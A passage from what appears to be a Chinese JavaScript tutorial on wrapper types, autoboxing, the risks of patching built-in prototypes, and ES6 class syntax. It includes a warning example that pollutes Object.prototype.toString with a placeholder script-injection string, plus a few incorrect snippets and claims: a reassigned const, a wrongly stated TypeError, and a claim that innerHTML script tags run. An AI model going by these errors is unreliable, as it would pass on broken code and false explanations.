class="hljs JavaScript"><span class="hljs-comment">// 字符串操作方法</span><br><span class="hljs-string">&#x27;abc&#x27;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-string">&#x27;def&#x27;</span>)      <span class="hljs-comment">// &#x27;abcdef&#x27;</span><br><span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)      <span class="hljs-comment">// &#x27;el&#x27;</span><br><span class="hljs-string">&#x27;ABC&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>()      <span class="hljs-comment">// &#x27;abc&#x27;</span><br><br><span class="hljs-comment">// ES6+ 新增方法</span><br><span class="hljs-string">&#x27;  abc  &#x27;</span>.<span class="hljs-title function_">trim</span>()         <span class="hljs-comment">// &#x27;abc&#x27;</span><br><span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;he&#x27;</span>) <span class="hljs-comment">// true</span><br><span class="hljs-string">&#x27;abc&#x27;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>)          <span class="hljs-comment">// &#x27;abcabc&#x27;</span><br><br><span class="hljs-comment">// 迭代方法</span><br><span class="hljs-string">&#x27;😊&#x27;</span>.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>)      <span class="hljs-comment">// 128522</span><br></code></pre></td></tr></table></figure><p><strong>Number 包装类型</strong></p><p>原型链结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Number实例]<br>→ Number.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p>Number.prototype 核心方法:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 转换方法</span><br>(<span class="hljs-number">123.456</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)    <span class="hljs-comment">// &#x27;123.46&#x27;</span><br>(<span class="hljs-number">255</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)      <span class="hljs-comment">// &#x27;ff&#x27;</span><br><br><span class="hljs-comment">// ES6+ 新增方法</span><br><span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(<span class="hljs-number">5.0</span>)   <span class="hljs-comment">// true</span><br>(<span class="hljs-number">1000</span>).<span class="hljs-title function_">toExponential</span>()  <span class="hljs-comment">// &#x27;1e+3&#x27;</span><br><br><span class="hljs-comment">// 数值格式化</span><br>(<span class="hljs-number">123456.789</span>).<span class="hljs-title function_">toLocaleString</span>(<span class="hljs-string">&#x27;de-DE&#x27;</span>) <span class="hljs-comment">// &#x27;123.456,789&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Boolean 包装类型</strong></p><p>原型链结构：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Boolean实例]<br>→ Boolean.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p>Boolean.prototype 方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 基本方法</span><br><span class="hljs-literal">true</span>.<span class="hljs-title function_">toString</span>()         <span class="hljs-comment">// &#x27;true&#x27;</span><br><span class="hljs-literal">false</span>.<span class="hljs-title function_">valueOf</span>()         <span class="hljs-comment">// false</span><br><br><span class="hljs-comment">// 注意：Boolean包装对象的方法较少</span><br></code></pre></td></tr></table></figure><p><strong>自动装箱与拆箱机制</strong></p><p>（1）自动装箱</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原始值访问属性时自动创建包装对象</span><br><span class="hljs-keyword">const</span> str = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-property">length</span>); <span class="hljs-comment">// 5 (临时创建String对象)</span><br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-keyword">const</span> temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(str);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(temp.<span class="hljs-property">length</span>);<br>temp = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 使用后立即销毁</span><br></code></pre></td></tr></table></figure><p>（2）手动装箱与拆箱</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 手动创建包装对象</span><br><span class="hljs-keyword">const</span> strObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>);<br><span class="hljs-keyword">const</span> numObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">const</span> boolObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 拆箱操作</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">valueOf</span>()); <span class="hljs-comment">// &#x27;hello&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj + <span class="hljs-number">1</span>);      <span class="hljs-comment">// 124 (自动调用valueOf)</span><br></code></pre></td></tr></table></figure><p><strong>原始值与包装对象的区别</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&#x27;hello&#x27;</span>           <span class="hljs-comment">// &#x27;string&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) <span class="hljs-comment">// &#x27;object&#x27;</span><br><br><span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>   <span class="hljs-comment">// false</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>valueOf() 的重要性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> numObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">42</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj === <span class="hljs-number">42</span>);       <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj.<span class="hljs-title function_">valueOf</span>() === <span class="hljs-number">42</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="8-4-修改内置原型的风险与最佳实践"><a href="#8-4-修改内置原型的风险与最佳实践" class="headerlink" title="8.4 修改内置原型的风险与最佳实践"></a>8.4 修改内置原型的风险与最佳实践</h2><p><strong>主要风险</strong></p><p>（1）全局污染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 默认添加的属性是可枚举的</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">customMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 会输出 &quot;customMethod&quot; (污染for-in循环)</span><br>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// 包含自定义方法</span><br></code></pre></td></tr></table></figure><p>（2）命名冲突和覆盖风险</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不同库可能修改同一原型</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* A库的实现 */</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* B库的实现 */</span> &#125;; <span class="hljs-comment">// 后者覆盖前者</span><br><br><span class="hljs-comment">// 未来ECMAScript标准可能引入同名方法</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">includes</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 自定义实现 */</span> &#125;;<br><span class="hljs-comment">// 当ES2016引入标准includes方法时产生冲突</span><br></code></pre></td></tr></table></figure><p>（3）性能影响</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 修改原型会破坏引擎优化</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">newMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// V8引擎的隐藏类机制受影响</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-title function_">newMethod</span>(); <span class="hljs-comment">// 触发隐藏类转换，降低性能</span><br></code></pre></td></tr></table></figure><p>（4）安全漏洞</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 污染toString方法</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;maliciousCode()&lt;/script&gt;&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// 当系统调用toString时</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = someObject.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// 执行恶意代码</span><br></code></pre></td></tr></table></figure><p>（5）预期外行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 修改基础对象原型会影响所有对象</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isEmpty</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">length</span> === <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">// 意外影响第三方代码</span><br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>set.<span class="hljs-title function_">isEmpty</span>(); <span class="hljs-comment">// 抛出TypeError（Set没有keys方法）</span><br></code></pre></td></tr></table></figure><p><strong>最佳实践</strong></p><p>（1）安全扩展模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用Object.defineProperty控制属性特性</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">&#x27;safeMethod&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 实现 */</span> &#125;,<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 允许后续修改</span><br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,   <span class="hljs-comment">// 不会出现在for-in循环</span><br>  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>   <span class="hljs-comment">// 允许后续删除</span><br>&#125;);<br><br><span class="hljs-comment">// 检查方法是否已存在</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">safeMethod</span>) &#123;<br>  <span class="hljs-comment">// 安全添加</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）使用 Symbol 作为键</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建唯一Symbol键</span><br><span class="hljs-keyword">const</span> arrayUniqueMethod = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;arrayUniqueMethod&#x27;</span>);<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[arrayUniqueMethod] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-variable language_">this</span>)];<br>&#125;;<br><br>[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>][arrayUniqueMethod](); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p>（3）模块化扩展模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不修改原型，提供工具函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ArrayUtils</span> = &#123;<br>  <span class="hljs-attr">unique</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr)];<br>  &#125;,<br>  <span class="hljs-attr">shuffle</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;;<br><br><span class="hljs-comment">// 使用方式</span><br><span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">unique</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br></code></pre></td></tr></table></figure><p>（4）子类化替代方案</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-title function_">unique</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-variable language_">this</span>)];<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeArray</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>arr.<span class="hljs-title function_">unique</span>(); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p>（5）使用 Proxy 封装</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createEnhancedArray</span>(<span class="hljs-params">arr</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(arr, &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>      <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&#x27;unique&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(target)];<br>      &#125;<br>      <span class="hljs-keyword">return</span> target[prop];<br>    &#125;<br>  &#125;);<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-title function_">createEnhancedArray</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br>arr.<span class="hljs-title function_">unique</span>(); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p><strong>决策流程</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">是否需要修改内置原型？<br>├─ 是 → <br>│  ├─ 是否为标准Polyfill？ → 使用Object.defineProperty规范实现<br>│  ├─ 是否为项目特有需求？ → 考虑子类化或工具函数<br>│  └─ 是否影响第三方代码？ → 全面测试兼容性<br>└─ 否 → <br>   ├─ 使用工具函数/模块<br>   ├─ 使用现代语法特性<br>   └─ 考虑函数组合模式<br></code></pre></td></tr></table></figure><p><strong>总结建议</strong></p><ol><li>基本原则：永远不要修改 Object.prototype；避免修改其他内置原型，除非绝对必要；</li><li>必须修改时要有安全措施</li><li>长期维护考量：记录所有内置原型修改；为自定义方法&#x2F;属性添加前缀（比如<code>_myLibUnique</code>）；定期检查与最新 ECMAScript 标准的兼容性</li><li>团队协作规范：代码 review 中严格检查原型修改；使用 ESLint 规则限制；项目文档中明确记录扩展方法</li></ol><h1 id="第九章：现代-JavaScript-中的原型"><a href="#第九章：现代-JavaScript-中的原型" class="headerlink" title="第九章：现代 JavaScript 中的原型"></a>第九章：现代 JavaScript 中的原型</h1><h2 id="9-1-ES6-class-语法糖的本质"><a href="#9-1-ES6-class-语法糖的本质" class="headerlink" title="9.1 ES6 class 语法糖的本质"></a>9.1 ES6 <code>class</code> 语法糖的本质</h2><p>class 语法并非 ES6 全新引入的面向对象的继承模型，而是 JavaScript 现有的原型继承的语法糖</p><p><strong>结构对比</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ES5构造函数写法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// ES6 class 写法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>Babel 转译后的代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-params">instance, Constructor</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&quot;Cannot call a class as a function&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-params">target, props</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; props.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">var</span> descriptor = props[i];<br>    descriptor.<span class="hljs-property">enumerable</span> = descriptor.<span class="hljs-property">enumerable</span> || <span class="hljs-literal">false</span>;<br>    descriptor.<span class="hljs-property">configurable</span> = <span class="hljs-literal">true</span>;<br>    descriptor.<span class="hljs-property">writable</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, descriptor.<span class="hljs-property">key</span>, descriptor);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_createClass</span>(<span class="hljs-params">Constructor, protoProps, staticProps</span>) &#123;<br>  <span class="hljs-keyword">if</span> (protoProps) <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, protoProps);<br>  <span class="hljs-keyword">if</span> (staticProps) <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-title class_">Constructor</span>, staticProps);<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Constructor</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Person</span> = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">Person</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">_createClass</span>(<span class="hljs-title class_">Person</span>, [&#123;<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;sayHello&quot;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>));<br>    &#125;<br>  &#125;]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Person</span>;<br>&#125;();<br></code></pre></td></tr></table></figure><p><strong>核心特性解析</strong></p><p>（1）构造函数对应关系</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 等价于</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）方法定义本质</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  